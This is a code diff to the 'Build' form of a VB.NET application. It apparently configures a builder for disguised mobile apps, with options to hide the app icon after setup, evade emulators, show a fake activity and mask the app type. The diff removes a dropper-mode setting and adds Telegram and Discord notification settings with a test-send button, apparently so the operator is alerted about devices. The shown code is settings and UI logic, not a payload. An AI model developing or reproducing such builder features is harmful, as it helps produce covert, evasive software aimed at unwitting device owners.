@@ -4,6 +4,7 @@ Imports System.Linq
 Imports System.Text
 Imports System.Security.Cryptography
 Imports System.IO.Compression
+Imports System.Windows.Forms
 
 ' Helper implementations to satisfy build-time dependencies (ZipFile/ZipEntry, protection helpers)
 
@@ -203,7 +204,6 @@ Partial Public Class Build
             My.Settings("MaskType") = If(Me.cbMaskType IsNot Nothing AndAlso Me.cbMaskType.SelectedItem IsNot Nothing, Me.cbMaskType.SelectedItem.ToString(), String.Empty)
             My.Settings("FakeActivity") = If(Me.txtFakeActivity IsNot Nothing, Me.txtFakeActivity.Text, String.Empty)
             My.Settings("AntiEmulator") = If(Me.chkAntiEmulator IsNot Nothing, Me.chkAntiEmulator.Checked.ToString(), "False")
-            My.Settings("DropperMode") = If(Me.chkDropperMode IsNot Nothing, Me.chkDropperMode.Checked.ToString(), "False")
             My.Settings("HideIconAfterSetup") = GetHideIconAfterSetupChecked().ToString()
             My.Settings.Save()
         Catch
@@ -214,12 +214,7 @@ Partial Public Class Build
         Try
             If My.Settings("HideIconAfterSetup") IsNot Nothing Then
                 Dim hideIcon As Boolean = Convert.ToBoolean(My.Settings("HideIconAfterSetup").ToString())
-                If chkHideIconAfterSetup IsNot Nothing Then
-                    chkHideIconAfterSetup.Checked = hideIcon
-                Else
-                    Dim ctrl = grpProtectionOptions?.Controls("chkHideIconAfterSetup")
-                    If TypeOf ctrl Is CheckBox Then DirectCast(ctrl, CheckBox).Checked = hideIcon
-                End If
+                If chkHideIconAfterSetup IsNot Nothing Then chkHideIconAfterSetup.Checked = hideIcon
                 If Not hideIcon AndAlso Me.Pi1 IsNot Nothing Then Me.Pi1.Tag = "-"
             End If
         Catch
@@ -237,7 +232,6 @@ Partial Public Class Build
             End If
             If Me.txtFakeActivity IsNot Nothing AndAlso My.Settings("FakeActivity") IsNot Nothing Then Me.txtFakeActivity.Text = My.Settings("FakeActivity").ToString()
             If Me.chkAntiEmulator IsNot Nothing Then Me.chkAntiEmulator.Checked = Convert.ToBoolean(If(My.Settings("AntiEmulator") IsNot Nothing, My.Settings("AntiEmulator").ToString(), "False"))
-            If Me.chkDropperMode IsNot Nothing Then Me.chkDropperMode.Checked = Convert.ToBoolean(If(My.Settings("DropperMode") IsNot Nothing, My.Settings("DropperMode").ToString(), "False"))
         Catch
         End Try
     End Sub
@@ -291,6 +285,97 @@ Partial Public Class Build
             Return sha.ComputeHash(Encoding.UTF8.GetBytes(packageName))
         End Using
     End Function
+
+    Private Sub SaveSettings()
+        Try
+            Dim delim As Char = ChrW(31)
+            Dim parts As String() = New String() {
+                chkEnableNotify.Checked.ToString(),
+                If(cbNotifyType.SelectedItem IsNot Nothing, cbNotifyType.SelectedItem.ToString(), String.Empty),
+                txtTelegramToken.Text,
+                txtTelegramChatId.Text,
+                txtDiscordWebhook.Text
+            }
+            My.Settings("NotifySettings") = String.Join(delim, parts)
+            My.Settings.Save()
+        Catch
+        End Try
+    End Sub
+
+    Private Sub LoadSettings()
+        Try
+            Dim raw As String = If(My.Settings("NotifySettings") IsNot Nothing, My.Settings("NotifySettings").ToString(), String.Empty)
+            If Not String.IsNullOrEmpty(raw) Then
+                Dim delim As Char = ChrW(31)
+                Dim parts As String() = raw.Split(delim)
+                If parts.Length >= 5 Then
+                    chkEnableNotify.Checked = Convert.ToBoolean(parts(0))
+                    If Not String.IsNullOrEmpty(parts(1)) Then
+                        cbNotifyType.SelectedItem = parts(1)
+                    End If
+                    txtTelegramToken.Text = parts(2)
+                    txtTelegramChatId.Text = parts(3)
+                    txtDiscordWebhook.Text = parts(4)
+                End If
+            End If
+        Catch
+            cbNotifyType.SelectedIndex = 0
+            chkEnableNotify.Checked = False
+        End Try
+    End Sub
+
+    Private Sub UpdateVisibility()
+        grpTelegram.Visible = (cbNotifyType.SelectedItem IsNot Nothing AndAlso cbNotifyType.SelectedItem.ToString() = "Telegram")
+        grpDiscord.Visible = (cbNotifyType.SelectedItem IsNot Nothing AndAlso cbNotifyType.SelectedItem.ToString() = "Discord")
+    End Sub
+
+    Private Sub cbNotifyType_SelectedIndexChanged(sender As Object, e As EventArgs) Handles cbNotifyType.SelectedIndexChanged
+        UpdateVisibility()
+        SaveSettings()
+    End Sub
+
+    Private Sub chkEnableNotify_CheckedChanged(sender As Object, e As EventArgs) Handles chkEnableNotify.CheckedChanged
+        SaveSettings()
+    End Sub
+
+    Private Sub txtTelegramToken_TextChanged(sender As Object, e As EventArgs) Handles txtTelegramToken.TextChanged
+        SaveSettings()
+    End Sub
+
+    Private Sub txtTelegramChatId_TextChanged(sender As Object, e As EventArgs) Handles txtTelegramChatId.TextChanged
+        SaveSettings()
+    End Sub
+
+    Private Sub txtDiscordWebhook_TextChanged(sender As Object, e As EventArgs) Handles txtDiscordWebhook.TextChanged
+        SaveSettings()
+    End Sub
+
+    Private Sub btnTestNotify_Click(sender As Object, e As EventArgs) Handles btnTestNotify.Click
+        btnTestNotify.Enabled = False
+        SaveSettings()
+        Dim cfg As New NotifySettingsHelper.NotifyConfig With {
+            .Enabled = chkEnableNotify.Checked,
+            .NotifyType = If(cbNotifyType.SelectedItem IsNot Nothing, cbNotifyType.SelectedItem.ToString(), "Telegram"),
+            .TelegramToken = txtTelegramToken.Text.Trim(),
+            .TelegramChatId = txtTelegramChatId.Text.Trim(),
+            .DiscordWebhook = txtDiscordWebhook.Text.Trim()
+        }
+        NotifySettingsHelper.SaveNotifyConfig(cfg)
+
+        If Not cfg.Enabled Then
+            MessageBox.Show("Notifications are disabled.", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information)
+            btnTestNotify.Enabled = True
+            Return
+        End If
+
+        Dim success As Boolean = DeviceNotifyService.SendTestNotification(cfg, "Builder test")
+        If success Then
+            MessageBox.Show("Test notification sent successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)
+        Else
+            MessageBox.Show("Failed to send notification. Check token/chat id or webhook.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
+        End If
+        btnTestNotify.Enabled = True
+    End Sub
 
 End Class
 
